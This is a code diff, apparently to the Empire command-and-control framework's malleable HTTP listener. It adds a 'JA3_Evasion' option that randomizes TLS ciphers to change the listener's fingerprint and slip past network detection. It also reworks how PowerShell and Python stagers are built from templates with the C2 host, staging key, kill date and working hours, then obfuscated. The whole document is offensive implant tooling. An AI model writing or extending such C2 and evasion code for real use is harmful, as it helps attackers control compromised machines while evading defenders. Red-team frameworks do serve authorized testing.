@@ -131,6 +131,12 @@ class Listener(object):
                 "Required": False,
                 "Value": "",
             },
+            "JA3_Evasion": {
+                "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
+                "Required": False,
+                "Value": "False",
+                "SuggestedValues": ["True", "False"],
+            },
         }
 
         # required:
@@ -607,7 +613,6 @@ class Listener(object):
         # extract the set options for this instantiated listener
         port = listenerOptions["Port"]["Value"]
         host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         killDate = listenerOptions["KillDate"]["Value"]
@@ -626,16 +631,33 @@ class Listener(object):
         stage2 = profile.stager.client.random_uri()
 
         if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            # read in the stager base
-            with open(
-                "%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath)
-            ) as f:
-                stager = f.read()
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http_malleable/http_malleable.ps1")
+
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": stagingKey,
+                "session_cookie": "",
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
             stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
+            # make sure the server ends with "/"
+            if not host.endswith("/"):
+                host += "/"
+
+            # Patch in custom Headers
             # patch in custom headers
             if profile.stager.client.headers:
                 headers = ",".join(
@@ -648,31 +670,14 @@ class Listener(object):
                     '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                 )
 
-            # patch in working hours
-            if workingHours:
-                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
+            comms_code = self.generate_comms(
+                listenerOptions=listenerOptions, language=language
+            )
 
-            # patch in the killdate
-            if killDate:
-                stager = stager.replace("REPLACE_KILLDATE", killDate)
-
-            # patch in the server and key information
-            stager = stager.replace("REPLACE_SERVER", host)
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("/index.jsp", stage1)
-            stager = stager.replace("/index.php", stage2)
-
-            unobfuscated_stager = ""
-            # forces inputs into a bytestring to ensure 2/3 compatibility
             stagingKey = stagingKey.encode("UTF-8")
-            # stager = stager.encode('UTF-8')
-            # randomizedStager = randomizedStager.encode('UTF-8')
-
-            for line in stager.split("\n"):
-                line = line.strip()
-                # skip commented line
-                if not line.startswith("#"):
-                    unobfuscated_stager += line
+            unobfuscated_stager = listener_util.remove_lines_comments(
+                comms_code + stager
+            )
 
             if obfuscate:
                 unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
@@ -691,23 +696,30 @@ class Listener(object):
                 return unobfuscated_stager
 
         elif language.lower() == "python":
+            comms_code = self.generate_comms(
+                listenerOptions=listenerOptions, language=language
+            )
+
             template_path = [
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
             ]
             eng = templating.TemplateEngine(template_path)
-            template = eng.get_template("http.py")
+            template = eng.get_template("http_malleable/http_malleable.py")
 
             template_options = {
                 "working_hours": workingHours,
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "profile": profileStr,
+                "session_cookie": "",
+                "host": host,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
 
             stager = template.render(template_options)
+            stager = stager.replace("REPLACE_COMMS", comms_code)
 
             if encode:
                 return base64.b64encode(stager)
@@ -769,12 +781,6 @@ class Listener(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
-            # path in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
-
             # strip out the comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
@@ -811,12 +817,6 @@ class Listener(object):
                 f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
-
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -1100,7 +1100,6 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
             elif language.lower() == "python":
                 # Python
-
                 updateServers = "server = '%s'\n" % (host)
 
                 # ==== HANDLE SSL ====
@@ -1684,6 +1683,8 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
             return Response(self.default_response(), 200)
 
         try:
+            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]
+
             if host.startswith("https"):
                 if certPath.strip() == "" or not os.path.isdir(certPath):
                     log.info(f"Unable to find certpath {certPath}, using default.")
@@ -1704,6 +1705,10 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     "%s/empire-chain.pem" % (certPath),
                     "%s/empire-priv.key" % (certPath),
                 )
+
+                if ja3_evasion:
+                    context.set_ciphers(listener_util.generate_random_cipher())
+
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
